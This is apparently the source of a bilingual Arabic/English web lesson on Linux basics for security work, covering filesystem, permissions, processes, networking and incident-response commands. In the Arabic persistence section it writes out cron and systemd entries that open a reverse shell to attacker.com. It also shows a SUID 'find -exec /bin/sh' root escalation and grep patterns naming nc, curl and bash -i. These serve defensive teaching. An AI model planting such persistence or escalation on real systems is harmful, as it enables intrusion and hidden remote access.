"use client";
import { LessonShell, Section, Callout, Code, Terminal, Step, TwoCol, Card, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="linux-fundamentals">
      <L
        ar={<>
          <Section title="ليه أنت محتاج Linux أصلاً؟">
            <p>تخيل السيناريو ده. أنت analyst جديد في SOC. الساعة 3 الفجر، alert: "suspicious outbound connection from web-prod-01". تفتح الـ ticket. السيرفر Linux. أنت طول عمرك Windows.</p>
            <p>دخلت SSH. شفت prompt أسود. كتبت <span className="eng">dir</span>. قال "command not found". كتبت <span className="eng">tasklist</span>. نفس الحكاية.</p>
            <p>حاولت تفتح Task Manager. مفيش. حاولت تشوف الـ network connections من واجهة. مفيش. والـ attacker لسه شغّال جوّه. والمدير بيسألك كل 10 دقايق "إيه الموقف؟".</p>
            <p>الموقف؟ أنت ضايع. مش لإنك غبي — لإن أنت ما اتعلمتش الأداة.</p>
            <p>كل أداة هجومية وحمائية محترمة بتشتغل على Linux. Kali، Parrot، 70% من سيرفرات الإنترنت، معظم الـ ICS، كل الـ containers، Android تحته Linux، حتى الـ macOS الـ shell بتاعه قريب جداً منه.</p>
            <p>اوعى تقنع نفسك إنك ممكن تبقى محترف أمن وأنت بتخاف من الـ terminal. خلاص. الموضوع مش "نصيحة"، ده شرط دخول.</p>
            <Callout kind="info" title="الهدف من الدرس">
              بعد ما تخلّصه هتفهم: الـ filesystem، الصلاحيات، العمليات، الشبكة، الـ persistence mechanisms، والأوامر اللي هتكتبها كل يوم — سواء أنت Red ولا Blue.
            </Callout>
          </Section>

          <Section title="القصة كاملة — تحقيق على سيرفر مخترق بأدوات أساسية بس">
            <p>خلّيني أمشّيك على سيناريو حقيقي. وصلك alert: "outbound traffic to suspicious IP". السيرفر <span className="eng">web-prod-01</span>. مفيش EDR. مفيش XDR. عندك SSH وأدوات الـ base system. ابدأ.</p>
            <Step n={1} title="مين أنا ومين شغّال على السيرفر؟">
              <Terminal lines={[
                { p: "id                       # # هويتي دلوقتي" },
                { p: "who                      # # مين logged in حالياً" },
                { p: "last -20                 # # آخر 20 login — في حد دخل في وقت غريب؟" },
                { p: "lastb -20                # # محاولات login فاشلة — brute force؟" },
              ]} />
            </Step>
            <Step n={2} title="إيه اللي شغّال؟">
              <Terminal lines={[
                { p: "ps auxf                  # # كل العمليات بشكل شجري" },
                { p: "ps aux | grep -E 'nc|wget|curl|python|perl|bash -i'    # # أدوات بتستخدم في reverse shells" },
                { p: "ps aux --sort=-%cpu | head    # # أعلى استهلاك CPU — miner؟" },
              ]} />
              <p>لو لقيت <span className="eng">python -c 'import socket...'</span> أو <span className="eng">bash -i &gt;&amp; /dev/tcp/...</span>، ده reverse shell. صوّر الـ screen، ما تقفلش العملية لحد ما تجمع الأدلة.</p>
            </Step>
            <Step n={3} title="الشبكة بتقول إيه؟">
              <Terminal lines={[
                { p: "ss -tunap                # # كل اتصالات TCP/UDP + العملية المالكة" },
                { p: "ss -tunap | grep ESTAB   # # اتصالات قائمة دلوقتي" },
                { p: "# # اتصال طالع لـ IP غريب؟ خد الـ PID وروح اعرف العملية:" },
                { p: "ls -la /proc/<PID>/exe   # # المسار الفعلي للـ binary" },
                { p: "cat /proc/<PID>/cmdline | tr '\\0' ' '    # # الأمر كامل" },
              ]} />
            </Step>
            <Step n={4} title="فيه ملفات اتلمست لسه؟">
              <Terminal lines={[
                { p: "find / -type f -mmin -60 -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null" },
                { p: "find /tmp /var/tmp /dev/shm -type f 2>/dev/null    # # المهاجمين بيحبوا الأماكن دي" },
                { p: "find / -perm -4000 -type f -newer /etc/hostname 2>/dev/null    # # SUID جديد — privesc backdoor" },
              ]} />
            </Step>
            <Step n={5} title="السجلات">
              <Terminal lines={[
                { p: "grep 'Accepted' /var/log/auth.log | tail -50    # # logins ناجحة" },
                { p: "grep 'sudo' /var/log/auth.log | tail -50         # # sudo activity" },
                { p: "history                  # # تاريخ الـ shell — لو المهاجم نسي يمسحه" },
                { p: "cat ~/.bash_history /home/*/.bash_history 2>/dev/null" },
              ]} />
            </Step>
            <p>كل ده بأدوات base system. مفيش tool فاخر. ده اللي بنقصد بيه "تبقى مرتاح في الـ command line".</p>
          </Section>

          <Section title="نظام الملفات — الخريطة">
            <Code lang="text">{`/           ← الجذر
├── bin/    ← أوامر أساسية للجميع (ls, cp, mv)
├── sbin/   ← أوامر للـ root (fdisk, iptables)
├── etc/    ← ملفات الإعدادات (passwd, shadow, hosts)
├── home/   ← مجلدات المستخدمين
├── root/   ← مجلد المستخدم root
├── var/    ← متغير: logs, mail, web (/var/www)
├── tmp/    ← مؤقت — يُمسح عند إعادة التشغيل
├── usr/    ← برامج المستخدم (usr/local/bin)
├── proc/   ← افتراضي — معلومات العمليات والنواة
├── sys/    ← افتراضي — أجهزة وkernel
└── opt/    ← برامج طرف ثالث`}</Code>
            <p>المهم في الأمن: <span className="eng">/etc/passwd, /etc/shadow, /etc/sudoers, /var/log/, /home/*/.ssh/, /proc/*/environ</span>.</p>
          </Section>

          <Section title="أوامر التنقل والملفات">
            <Terminal lines={[
              { p: "pwd                      # المسار الحالي" },
              { p: "ls -la                   # كل الملفات (حتى المخفية) مع التفاصيل" },
              { p: "cd /var/log              # ذهاب" },
              { p: "find / -name 'config*' 2>/dev/null    # ابحث في كامل النظام" },
              { p: "grep -r 'password' /etc/ 2>/dev/null  # ابحث عن نص" },
              { p: "cat /etc/passwd          # اعرض ملف" },
              { p: "less /var/log/syslog     # تصفّح ملف كبير (q للخروج)" },
              { p: "head -20 file            # أول 20 سطر" },
              { p: "tail -f /var/log/auth.log    # تابع ملف لحظياً" },
            ]} />
          </Section>

          <Section title="الصلاحيات — أهم مفهوم تفهمه">
            <p>كل ملف ليه تلات مجموعات صلاحيات: المالك، الجروب، باقي الناس. وكل مجموعة ليها تلات حروف: <span className="eng">r</span> قراءة، <span className="eng">w</span> كتابة، <span className="eng">x</span> تنفيذ. بسيطة لما تستوعبها، خطيرة لما تتجاهلها.</p>
            <p>زي ما البواب يقفل الباب الكبير ويسيب شباك الحمام مفتوح. الـ permissions لو واحد فيهم غلط، الباقي مالوش لازمة.</p>
            <Code lang="text">{`-rwxr-xr--  1 alice  staff  120 Apr 30 10:15 script.sh
 │└┬┘└┬┘└┬┘
 │ │  │  └── الجميع: قراءة فقط
 │ │  └───── المجموعة: قراءة + تنفيذ
 │ └──────── المالك: كل شيء
 └────────── - = ملف عادي ('d' = مجلد، 'l' = symlink)`}</Code>
            <Terminal lines={[
              { p: "chmod 755 file        # rwxr-xr-x — الأكثر شيوعاً للسكربتات" },
              { p: "chmod +x script.sh    # أضف تنفيذ" },
              { p: "chown alice:staff f   # غيّر المالك والمجموعة" },
              { p: "" },
              { p: "# # في الأمن: ابحث عن SUID — ملفات تشتغل بصلاحيات مالكها:" },
              { p: "find / -perm -4000 -type f 2>/dev/null" },
              { p: "# # القائمة دي مهمة جداً لـ privilege escalation — راجع GTFOBins" },
            ]} />
            <Callout kind="danger" title="قصة الـ SUID — ليه /usr/bin/passwd خطر مفهوم؟">
              لما أنت user عادي وعايز تغيّر كلمة سرك، الكلمة دي بتتكتب فين؟ في <span className="eng">/etc/shadow</span>. الملف ده <b>root فقط</b> يقدر يكتب فيه. طب أنت كـ user عادي، إزاي بتغيّر كلمتك؟
              <br /><br />
              الإجابة: <span className="eng">/usr/bin/passwd</span> عليه <b>SUID bit</b>. يعني لما أنت تشغّله، البرنامج بيشتغل بصلاحيات <b>المالك بتاعه — اللي هو root</b>، مش بصلاحياتك أنت. فبيقدر يكتب في shadow.
              <br /><br />
              ده تصميم سليم لـ <span className="eng">passwd</span>. <b>المشكلة:</b> لو في binary تاني عليه SUID وأنت تقدر تتحكم في إدخاله، أنت دلوقتي بتشغّل كود كـ root. مثال: <span className="eng">find</span> عليه SUID؟ <span className="eng">find . -exec /bin/sh \;</span> = root shell فوري.
              <br /><br />
              <b>اللي بيحصل فعلياً:</b> أدمن مكسول كتب script لازم يشتغل كـ root، حطّ عليه SUID علشان "يخلّص الموضوع". ما اتنبهش إن أي user يقدر يستغله. أنت كـ pentester بتمشي على <span className="eng">find / -perm -4000</span> وبتلاقي الجوهرة دي.
              <br /><br />
              <b>الحماية:</b> <span className="eng">find / -perm -4000 -type f 2&gt;/dev/null</span> دورياً، قارن بقائمة baseline، أي إضافة جديدة = حقّق فيها. ولو ممكن، اشتغل بـ <span className="eng">capabilities</span> بدل SUID — أدق وأقل خطر.
            </Callout>
          </Section>

          <Section title="المستخدمون والـ root">
            <ul>
              <li><span className="eng">/etc/passwd</span> — قائمة المستخدمين (مقروء للجميع).</li>
              <li><span className="eng">/etc/shadow</span> — كلمات السر مهشّمة (root فقط).</li>
              <li><span className="eng">/etc/sudoers</span> — من يحق له <span className="eng">sudo</span>.</li>
            </ul>
            <Terminal lines={[
              { p: "id                  # هويتي و مجموعاتي" },
              { p: "whoami              # اسم المستخدم" },
              { p: "sudo -l             # أوامر مسموحة لي بـ sudo (مهم للـ priv esc)" },
              { p: "su -                # تحول لـ root" },
              { p: "passwd              # غيّر كلمة سرك" },
            ]} />
          </Section>

          <Section title="العمليات">
            <Terminal lines={[
              { p: "ps aux              # كل العمليات" },
              { p: "ps -ef --forest     # عرض شجري" },
              { p: "top                 # حي + متفاعل (q للخروج)" },
              { p: "htop                # أجمل من top" },
              { p: "kill -9 1234        # اقتل عملية بـ PID 1234" },
              { p: "pgrep nginx         # ابحث عن PID لاسم" },
              { p: "" },
              { p: "# ابحث عن أوامر مشبوهة في الذاكرة:" },
              { p: "ps aux | grep -E 'nc|wget|curl|python -c'" },
            ]} />
          </Section>

          <Section title="الشبكة — أوامر يومية">
            <Terminal lines={[
              { p: "ip a                 # كل الواجهات و IPs" },
              { p: "ip r                 # جدول التوجيه (gateway افتراضي)" },
              { p: "ss -tulpn            # كل المنافذ المفتوحة + العملية المالكة (بديل netstat)" },
              { p: "curl -I https://example.com    # رؤوس HTTP فقط" },
              { p: "dig example.com      # استعلام DNS" },
              { p: "nslookup example.com" },
              { p: "tcpdump -i eth0 -nn port 80    # التقط حزم port 80" },
              { p: "traceroute 8.8.8.8   # مسار الحزم" },
            ]} />
          </Section>

          <Section title="إعادة التوجيه والـ pipes">
            <Terminal lines={[
              { p: "command > out.txt           # أعد STDOUT إلى ملف (يكتب فوقه)" },
              { p: "command >> out.txt          # أضف للملف" },
              { p: "command 2> err.txt          # STDERR منفصل" },
              { p: "command > out.txt 2>&1      # كل شيء لملف واحد" },
              { p: "command1 | command2         # اربط — مخرج الأول يصبح مدخل الثاني" },
              { p: "" },
              { p: "# مثال أمني — ابحث عن IPs غير ناجحة في log:" },
              { p: "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head" },
            ]} />
          </Section>

          <Section title="أوامر مفيدة جداً للأمن">
            <Code lang="bash">{`# تجميع info كامل عن مستخدم:
id alice && groups alice && lastlog -u alice

# اعرض كل cron jobs على النظام:
for u in $(cut -f1 -d: /etc/passwd); do crontab -u $u -l 2>/dev/null; done

# ابحث عن ملفات حديثة التعديل (ربما تركها مهاجم):
find /tmp /var/tmp /dev/shm -type f -mmin -60 2>/dev/null

# اعرض حزم منصبة (للبحث عن أداة قديمة بثغرة):
dpkg -l | grep -i openssh    # Debian/Ubuntu
rpm -qa | grep -i openssh    # RHEL/CentOS

# تشيك تكامل ملف:
sha256sum important.bin

# تشفير سريع:
echo "hello" | base64
echo "aGVsbG8K" | base64 -d`}</Code>
          </Section>

          <Section title="قصة الـ Persistence — cron و systemd">
            <p>المهاجم اللي دخل سيرفرك مش هيقعد بصّ. هو عايز يفضل جوّه حتى لو الـ shell اتقفلت أو السيرفر اتعمله reboot. ده اسمه <b>persistence</b>. وفي Linux، أشهر مكانين: <span className="eng">cron</span> و <span className="eng">systemd</span>.</p>
            <Step n={1} title="cron — الكلاسيكي اللي مبيموتش">
              <p>السيناريو: المهاجم دخل بـ web shell. كاتب سطر واحد في <span className="eng">crontab</span>:</p>
              <Code lang="bash">{`# يشتغل كل 5 دقايق، يفتح reverse shell
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'`}</Code>
              <p>عملت reboot؟ مفيش فرق. قفلت الـ web shell؟ مفيش فرق. كل 5 دقايق، السيرفر بنفسه بيتصل بالمهاجم. <b>ليه ده شغّال؟</b> لإن cron بيشتغل كـ daemon من أول لحظة الـ boot.</p>
              <p><b>الحماية — كده تلاقيه:</b></p>
              <Terminal lines={[
                { p: "# # كل cron jobs لكل user على النظام:" },
                { p: "for u in $(cut -f1 -d: /etc/passwd); do echo \"=== $u ===\"; crontab -u $u -l 2>/dev/null; done" },
                { p: "ls -la /etc/cron.* /etc/crontab    # # system-wide crons" },
                { p: "ls -la /var/spool/cron/crontabs/    # # user crons (Debian/Ubuntu)" },
                { p: "grep -r 'tcp\\|wget\\|curl\\|bash -i' /etc/cron* /var/spool/cron/ 2>/dev/null" },
              ]} />
            </Step>
            <Step n={2} title="systemd — الجديد، الأنيق، والأخطر">
              <p>cron قديم وأي blue team عنده alerts عليه. المهاجمين الأذكى انتقلوا لـ systemd. ليه؟ لإن أي service systemd ممكن تكون legitimate، فبيتستّر وسط الضوضاء.</p>
              <Code lang="bash">{`# /etc/systemd/system/syslog-helper.service
[Unit]
Description=System Log Helper

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/attacker.com/4444 0>&1; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target`}</Code>
              <p>بعدها: <span className="eng">systemctl enable --now syslog-helper</span>. الاسم "syslog-helper" مقصود — يخلي الـ admin يعدّيه لما يسكان. الـ service هيعيد نفسه مع الـ boot، ولو فشل هيـ restart نفسه.</p>
              <p><b>الحماية:</b></p>
              <Terminal lines={[
                { p: "systemctl list-unit-files --state=enabled    # # كل services شغّالة مع البوت" },
                { p: "ls -la /etc/systemd/system/*.service    # # custom services (مش اللي جايين مع الـ packages)" },
                { p: "systemctl list-units --type=service --state=running" },
                { p: "# # ابحث عن services بتشغّل bash/python/curl:" },
                { p: "grep -rE 'ExecStart=.*(bash|python|curl|wget|nc)' /etc/systemd/system/ 2>/dev/null" },
                { p: "# # أي service مش معروفة، حقّق فيها:" },
                { p: "systemctl cat <service-name>" },
              ]} />
            </Step>
            <Callout kind="good" title="الحماية / Defense">
              اكتبها على ظهر إيدك: خد baseline من <span className="eng">crontab -l</span> + <span className="eng">systemctl list-unit-files</span> على سيرفر نضيف. أي اختلاف عن الـ baseline = تحقيق فوري. ولو في المؤسسة، خلي auditd بيراقب <span className="eng">/etc/cron*</span> و <span className="eng">/etc/systemd/system/</span> — أي تعديل فيهم alert.
              لو ما عملتش الـ baseline ده، أنت ونصيبك.
            </Callout>
          </Section>

          <Section title="جدول الأوامر اليومية — اللي هتكتبه فعلاً">
            <div className="overflow-x-auto">
              <table className="w-full text-sm border-collapse">
                <thead>
                  <tr className="border-b border-slate-700">
                    <th className="text-start p-2">الموقف</th>
                    <th className="text-start p-2">الأمر</th>
                    <th className="text-start p-2">ليه؟</th>
                  </tr>
                </thead>
                <tbody>
                  <tr className="border-b border-slate-800"><td className="p-2">عرفت إيه شغّال على بورت</td><td className="p-2"><span className="eng">ss -tulpn | grep :443</span></td><td className="p-2">يقولك العملية المالكة كمان، مش بس البورت</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">في حد بياكل CPU</td><td className="p-2"><span className="eng">ps aux --sort=-%cpu | head</span></td><td className="p-2">أعلى 10 عمليات استهلاكاً — miner؟</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">السيرفر بطيء فجأة</td><td className="p-2"><span className="eng">top</span> ثم <span className="eng">iotop</span></td><td className="p-2">CPU ولا I/O؟ كل واحد سبب مختلف</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">تدوّر على ملف</td><td className="p-2"><span className="eng">find / -name "*.conf" 2&gt;/dev/null</span></td><td className="p-2">الـ <span className="eng">2&gt;/dev/null</span> بيكتم رسائل permission denied</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">تدوّر على نص جوّه ملفات</td><td className="p-2"><span className="eng">grep -rni "password" /etc/ 2&gt;/dev/null</span></td><td className="p-2">recursive + case insensitive + line numbers</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">تتابع log حي</td><td className="p-2"><span className="eng">tail -f /var/log/auth.log</span></td><td className="p-2">أي سطر جديد بيظهر فوراً</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">الـ disk اتملا</td><td className="p-2"><span className="eng">du -sh /* 2&gt;/dev/null | sort -h</span></td><td className="p-2">مين أكبر مجلد، human readable</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">لاقيت process مشبوه</td><td className="p-2"><span className="eng">ls -la /proc/&lt;PID&gt;/exe</span></td><td className="p-2">المسار الفعلي للـ binary حتى لو اتمسح</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">ملف غريب في /tmp</td><td className="p-2"><span className="eng">file suspicious.bin</span> + <span className="eng">strings suspicious.bin | head</span></td><td className="p-2">إيه نوعه + أي نصوص جواه</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">بتفك base64</td><td className="p-2"><span className="eng">echo "..." | base64 -d</span></td><td className="p-2">المهاجمين بيخبّوا الأوامر بـ base64</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">بتعمل reverse DNS</td><td className="p-2"><span className="eng">dig -x 8.8.8.8</span></td><td className="p-2">PTR lookup — مين الـ IP ده</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">بتعمل packet capture</td><td className="p-2"><span className="eng">tcpdump -i any -nn -w cap.pcap port 443</span></td><td className="p-2"><span className="eng">-nn</span> = ما تحلّش الـ DNS، أسرع</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">تـ enum users</td><td className="p-2"><span className="eng">{`awk -F: '$3 >= 1000 {print $1}' /etc/passwd`}</span></td><td className="p-2">UIDs &ge; 1000 = users فعليين</td></tr>
                  <tr className="border-b border-slate-800"><td className="p-2">sudo permissions</td><td className="p-2"><span className="eng">sudo -l</span></td><td className="p-2">إيه اللي مسموح ليّ كـ sudo — أول حاجة في privesc</td></tr>
                  <tr><td className="p-2">آخر logins</td><td className="p-2"><span className="eng">last -20</span> + <span className="eng">lastb -20</span></td><td className="p-2">ناجح + فاشل، الفرق مهم</td></tr>
                </tbody>
              </table>
            </div>
          </Section>

          <Section title="أهم ملفات تنظر إليها كمدافع/مهاجم">
            <TwoCol>
              <Card title="ملفات اعتماد ومفاتيح" color="red">
                <span className="eng">~/.ssh/, ~/.aws/credentials, ~/.docker/config.json, /var/lib/jenkins/secrets/</span>
              </Card>
              <Card title="سجلات" color="blue">
                <span className="eng">/var/log/auth.log, /var/log/syslog, /var/log/audit/audit.log, ~/.bash_history</span>
              </Card>
              <Card title="إعدادات حساسة" color="amber">
                <span className="eng">/etc/sudoers, /etc/ssh/sshd_config, /etc/passwd, /etc/shadow, /etc/cron.d/</span>
              </Card>
              <Card title="البقاء (Persistence)" color="red">
                <span className="eng">~/.bashrc, ~/.profile, /etc/rc.local, systemd units, cron, at jobs</span>
              </Card>
            </TwoCol>
          </Section>

          <Section title="ممارسة">
            <ol>
              <li>ادخل لـ Kali VM، ونفّذ كل أوامر الدرس ده. مش تقرأها — تكتبها بإيدك.</li>
              <li>أنشئ مستخدمين، اضبط صلاحيات على ملفات، اقرأ <span className="eng">/etc/shadow</span> كـ root و كـ user عادي — احس الفرق بنفسك.</li>
              <li>دور على SUID binaries على Kali، قارن بـ <span className="eng">gtfobins.github.io</span> — جرّب exploit واحد على الأقل.</li>
              <li>اعمل cron job يكتب timestamp كل دقيقة في <span className="eng">/tmp/test.log</span>، شوفه شغّال، بعدين امسحه.</li>
              <li>اعمل systemd service بسيطة، فعّلها، شوف <span className="eng">systemctl status</span>، وامسحها بنظافة.</li>
              <li>اقرأ <span className="eng">man bash</span> — لو مرة واحدة في حياتك.</li>
            </ol>
          </Section>

          <Section title="الخلاصة الناشفة">
            <ul>
              <li>Linux مش option. لو خايف من الـ terminal، أنت مش في المجال ده.</li>
              <li>الـ filesystem ليه منطق — احفظ <span className="eng">/etc</span>، <span className="eng">/var/log</span>، <span className="eng">/proc</span>، الباقي يجي مع الوقت.</li>
              <li>SUID = أي binary بصلاحيات مالكه. <span className="eng">find / -perm -4000</span> أول حاجة في privesc.</li>
              <li>cron + systemd = أشهر مكانين للـ persistence. اعملهم baseline، راقب التغيير.</li>
              <li>كل alert في SOC على سيرفر Linux، أنت محتاج <span className="eng">ps</span>, <span className="eng">ss</span>, <span className="eng">find</span>, <span className="eng">grep</span> — كده.</li>
              <li>لو ما اتعلمتش الـ shell، الـ tools الفاخرة مش هتنفعك. هي بتأتمت اللي أنت بتعمله بإيدك. لو ما بتعرفش تعمله بإيدك، الـ tool بيتحوّل لصندوق أسود.</li>
            </ul>
          </Section>
        </>}
        en={<>
          <Section title="Why Linux first">
            <p>Every important offensive and defensive tool runs on Linux. Kali, Parrot, internet servers, much of ICS, containers, Android underneath everything. You cannot be a security professional without fluency in the Linux command line.</p>
            <Callout kind="info" title="Goal">
              By the end you&apos;ll understand the filesystem, permissions, processes, networking, and the daily commands you&apos;ll use in any pentest.
            </Callout>
          </Section>

          <Section title="The filesystem — the map">
            <Code lang="text">{`/           ← root
├── bin/    ← essential commands (ls, cp, mv)
├── sbin/   ← root-only commands (fdisk, iptables)
├── etc/    ← configuration (passwd, shadow, hosts)
├── home/   ← user home dirs
├── root/   ← root user's home
├── var/    ← variable: logs, mail, web (/var/www)
├── tmp/    ← temporary — wiped on reboot
├── usr/    ← user programs (usr/local/bin)
├── proc/   ← virtual — process and kernel info
├── sys/    ← virtual — devices and kernel
└── opt/    ← third-party software`}</Code>
            <p>Security-relevant: <span className="eng">/etc/passwd, /etc/shadow, /etc/sudoers, /var/log/, /home/*/.ssh/, /proc/*/environ</span>.</p>
          </Section>

          <Section title="Navigation and files">
            <Terminal lines={[
              { p: "pwd                      # current path" },
              { p: "ls -la                   # all files (incl. hidden) with details" },
              { p: "cd /var/log              # change directory" },
              { p: "find / -name 'config*' 2>/dev/null    # search the whole tree" },
              { p: "grep -r 'password' /etc/ 2>/dev/null  # text search" },
              { p: "cat /etc/passwd          # show file" },
              { p: "less /var/log/syslog     # paginate large files (q to quit)" },
              { p: "head -20 file            # first 20 lines" },
              { p: "tail -f /var/log/auth.log    # follow file live" },
            ]} />
          </Section>

          <Section title="Permissions — the most important concept">
            <p>Every file has three permission groups: owner, group, other. Each group has three flags: <span className="eng">r</span> read, <span className="eng">w</span> write, <span className="eng">x</span> execute.</p>
            <Code lang="text">{`-rwxr-xr--  1 alice  staff  120 Apr 30 10:15 script.sh
 │└┬┘└┬┘└┬┘
 │ │  │  └── other: read only
 │ │  └───── group: read + execute
 │ └──────── owner: everything
 └────────── - = regular file ('d' = dir, 'l' = symlink)`}</Code>
            <Terminal lines={[
              { p: "chmod 755 file        # rwxr-xr-x — most common for scripts" },
              { p: "chmod +x script.sh    # add execute" },
              { p: "chown alice:staff f   # change owner and group" },
              { p: "" },
              { p: "# Security: hunt SUID — files that run with the owner's perms:" },
              { p: "find / -perm -4000 -type f 2>/dev/null" },
              { p: "# This is a critical privilege-escalation list — see GTFOBins" },
            ]} />
          </Section>

          <Section title="Users and root">
            <ul>
              <li><span className="eng">/etc/passwd</span> — user list (world-readable).</li>
              <li><span className="eng">/etc/shadow</span> — hashed passwords (root only).</li>
              <li><span className="eng">/etc/sudoers</span> — who can <span className="eng">sudo</span>.</li>
            </ul>
            <Terminal lines={[
              { p: "id                  # my identity and groups" },
              { p: "whoami              # username" },
              { p: "sudo -l             # what I can sudo (key for priv esc)" },
              { p: "su -                # become root" },
              { p: "passwd              # change my password" },
            ]} />
          </Section>

          <Section title="Processes">
            <Terminal lines={[
              { p: "ps aux              # all processes" },
              { p: "ps -ef --forest     # tree view" },
              { p: "top                 # live + interactive (q to quit)" },
              { p: "htop                # nicer top" },
              { p: "kill -9 1234        # kill PID 1234" },
              { p: "pgrep nginx         # find PID by name" },
              { p: "" },
              { p: "# hunt for suspicious commands in memory:" },
              { p: "ps aux | grep -E 'nc|wget|curl|python -c'" },
            ]} />
          </Section>

          <Section title="Networking — daily commands">
            <Terminal lines={[
              { p: "ip a                 # interfaces and IPs" },
              { p: "ip r                 # routing table (default gateway)" },
              { p: "ss -tulpn            # open ports + owning process (replaces netstat)" },
              { p: "curl -I https://example.com    # HTTP headers only" },
              { p: "dig example.com      # DNS query" },
              { p: "nslookup example.com" },
              { p: "tcpdump -i eth0 -nn port 80    # capture port-80 packets" },
              { p: "traceroute 8.8.8.8   # packet path" },
            ]} />
          </Section>

          <Section title="Redirection and pipes">
            <Terminal lines={[
              { p: "command > out.txt           # STDOUT to file (overwrite)" },
              { p: "command >> out.txt          # append" },
              { p: "command 2> err.txt          # STDERR separate" },
              { p: "command > out.txt 2>&1      # both to one file" },
              { p: "command1 | command2         # pipe — output of first feeds second" },
              { p: "" },
              { p: "# security example — top failed-login source IPs:" },
              { p: "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head" },
            ]} />
          </Section>

          <Section title="Useful security commands">
            <Code lang="bash">{`# full info on a user:
id alice && groups alice && lastlog -u alice

# every cron job on the system:
for u in $(cut -f1 -d: /etc/passwd); do crontab -u $u -l 2>/dev/null; done

# recently modified files (an attacker might have left them):
find /tmp /var/tmp /dev/shm -type f -mmin -60 2>/dev/null

# installed packages (look for vulnerable older tools):
dpkg -l | grep -i openssh    # Debian/Ubuntu
rpm -qa | grep -i openssh    # RHEL/CentOS

# integrity check:
sha256sum important.bin

# quick encoding:
echo "hello" | base64
echo "aGVsbG8K" | base64 -d`}</Code>
          </Section>

          <Section title="Files you watch as defender / attacker">
            <TwoCol>
              <Card title="Credentials and keys" color="red">
                <span className="eng">~/.ssh/, ~/.aws/credentials, ~/.docker/config.json, /var/lib/jenkins/secrets/</span>
              </Card>
              <Card title="Logs" color="blue">
                <span className="eng">/var/log/auth.log, /var/log/syslog, /var/log/audit/audit.log, ~/.bash_history</span>
              </Card>
              <Card title="Sensitive config" color="amber">
                <span className="eng">/etc/sudoers, /etc/ssh/sshd_config, /etc/passwd, /etc/shadow, /etc/cron.d/</span>
              </Card>
              <Card title="Persistence" color="red">
                <span className="eng">~/.bashrc, ~/.profile, /etc/rc.local, systemd units, cron, at jobs</span>
              </Card>
            </TwoCol>
          </Section>

          <Section title="Practice">
            <ol>
              <li>Boot Kali VM and run every command in this lesson.</li>
              <li>Create users, set permissions on files, read <span className="eng">/etc/shadow</span> as root and as a normal user — feel the difference.</li>
              <li>Find SUID binaries on Kali and check them against <span className="eng">gtfobins.github.io</span>.</li>
              <li>Skim <span className="eng">man bash</span> at least once.</li>
            </ol>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
